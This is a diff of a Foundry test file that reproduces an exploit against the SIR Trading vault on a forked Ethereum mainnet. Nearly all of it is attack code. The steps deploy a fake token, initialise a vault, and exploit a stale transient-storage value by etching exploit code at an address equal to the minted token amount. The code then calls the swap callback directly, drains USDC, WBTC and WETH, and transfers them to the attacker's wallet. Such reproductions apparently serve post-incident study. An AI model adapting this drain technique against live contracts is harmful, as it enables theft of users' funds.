@@ -9,7 +9,6 @@ import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {INonfungiblePositionManager} from "../../utils/INonfungiblePositionManager.sol";
 import {IImmutableCreate2Factory} from "../../utils/IImmutableCreate2Factory.sol";
 import {ISwapRouter} from "../../utils/ISwapRouter.sol";
-import {IQuoter} from "../../utils/IQuoter.sol";
 import {Token} from "./Token.sol";
 import {IVault} from "./IVault.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
@@ -25,7 +24,6 @@ interface IExploit {
 
 contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
     
-    // TODO: Check how to initialize this contract
     constructor() ERC20("TokenA", "A") {
         _mint(address(this), 200000000000000000000000000000000000000000000000000);
     }
@@ -34,17 +32,26 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
     INonfungiblePositionManager internal constant positionManager = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
     IImmutableCreate2Factory internal constant factory = IImmutableCreate2Factory(0x0000000000FFe8B47B3e2130213B802212439497);
     ISwapRouter internal constant swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    IQuoter internal constant quoter = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);
     IWETH9 internal constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 internal constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 internal constant wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
 
     function setUp() external {
         cheat.createSelectFork("mainnet", 22157899);
+
+        addTokenToTracker(address(weth));
+        addTokenToTracker(address(usdc));
+        addTokenToTracker(address(wbtc));
+        
+        updateBalanceTracker(address(this));
     }
 
     function test_attack() external {
-        // bytes memory code = type(Exploit).creationCode;
+        console.log('===== Initial Balances =====');
+        logBalancesWithLabel('Attacker', tx.origin);
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Victim', address(victim));
+
         console.log('===== STEP 1: Deploy TokenB and mint tokens =====');
         // Deploy a token to use as debt token
         IToken tokenB = IToken(address(new Token()));
@@ -103,10 +110,9 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
             sqrtPriceLimitX96: 0
         });
 
-        uint256 amountOut = swapRouter.exactInputSingle(params);
-        //0x0000000000000477d002faCeb0EC46CEECFC9E3E
-        //0x00000000001271551295307aCC16bA1e7E0d4281
-        console.log('===== STEP 3: Initialize vault =====');
+        swapRouter.exactInputSingle(params);
+        
+        console.log('===== STEP 3: Initialize Vault =====');
         // Initialize vault
         IVault.VaultParameters memory vaultParams = IVault.VaultParameters({
             debtToken: address(tokenB),
@@ -120,7 +126,7 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
         // Here, tokensToMint is still in the slot 1 of the transient storage of the victim contract
         // safeguarding the uniswapV3SwapCallback function. We need to find an address that has the same value and
         // then call the uniswapV3SwapCallback function directly.
-        console.log('===== STEP 5: Mint APE tokens =====');
+        console.log('===== STEP 4: Mint APE tokens =====');
         uint256 amountToDeposit = 139650998347915452795864661928406629; // Original Amount to deposit in the vault
         //uint256 amountToDeposit = 10 * 10**18; // Amount to deposit in the vault
         uint256 tokensMinted = victim.mint(
@@ -130,27 +136,27 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
             1
         );
 
-        //console.log("Tokens minted:", tokensMinted);
-
+        console.log('===== STEP 5: Deploy Exploit Contract at Farmed Address =====');
         //TODO: Here we should use create2 and deploy a contract with a precalculated address that has the same value as tokensMinted
         // bytes32 salt = 0;
         // bytes bytecode = type(Exploit).creationCode;
         // address vanityAddress = factory.safeCreate2(salt, bytecode);
 
         address vanityAddress = address(uint160(tokensMinted));
-        console.log("Vanity address:", vanityAddress);
         bytes memory runtimeCode = vm.getDeployedCode("Exploit.sol");
         cheat.etch(vanityAddress, runtimeCode);
 
+        console.log('===== STEP 6: Call exploit function in Exploit Contract =====');
         IExploit exploitContract = IExploit(vanityAddress);
-
-        //Log usdc balance before the exploit
-        uint256 usdcBalanceBefore = usdc.balanceOf(address(this));
-        console.log("USDC Balance of this before exploit:", usdcBalanceBefore);
-
         exploitContract.exploit(address(this));
 
+        logBalancesWithLabel('Attacker', tx.origin);
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Victim', address(victim));
+
+        console.log('===== STEP 7: Drain Tokens from Victim Contract directly from Exploit Coordinator =====');
         // Now keep draining other tokens from the victim contract
+        console.log('===== Drain WBTC from Victim Contract =====');
         IVault.VaultParameters memory vaultParamsWbtc = IVault.VaultParameters({
             debtToken: address(wbtc),
             collateralToken: address(this), // The address of TokenA and exploitCoordinator
@@ -178,14 +184,12 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
             int256(wbtcBalance),
             data
         );
-        //balance after of this
-        uint256 balanceAfter = wbtc.balanceOf(address(this));
-        console.log("WBTC Balance of this after exploit:", balanceAfter);
 
+        logBalancesWithLabel('Attacker', tx.origin);
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Victim', address(victim));
 
-       uint256 wethBalance = weth.balanceOf(address(this));
-       console.log("WETH Balance of this before exploit:", wethBalance);
-        
+        console.log('===== Drain WETH from Victim Contract =====');
         IVault.VaultParameters memory vaultParamsWeth = IVault.VaultParameters({
             debtToken: address(weth),
             collateralToken: address(this), // The address of TokenA and exploitCoordinator
@@ -202,9 +206,30 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
             data
         );
 
-        uint256 wethBalanceAfter = weth.balanceOf(address(this));
-        console.log("WETH Balance of this after exploit:", wethBalanceAfter);
-        
+        logBalancesWithLabel('Attacker', tx.origin);
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Victim', address(victim));
+
+        console.log('===== STEP 8: Transfer Funds to Attacker EOA =====');
+        // Transfer all funds from the attacker contract to the attacker's EOA
+        uint256 usdcBalance = usdc.balanceOf(address(this));
+        if (usdcBalance > 0) {
+            usdc.transfer(tx.origin, usdcBalance);
+        }
+        uint256 wethBalance = weth.balanceOf(address(this));
+        if (wethBalance > 0) {
+            weth.transfer(tx.origin, wethBalance);
+        }
+        uint256 wbtcBalanceAttacker = wbtc.balanceOf(address(this));
+        if (wbtcBalanceAttacker > 0) {
+            wbtc.transfer(tx.origin, wbtcBalanceAttacker);
+        }
+
+        logBalancesWithLabel('Attacker', tx.origin);
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Victim', address(victim));
+
+        console.log('===== Attack Completed =====');
     }
 
     function mint(
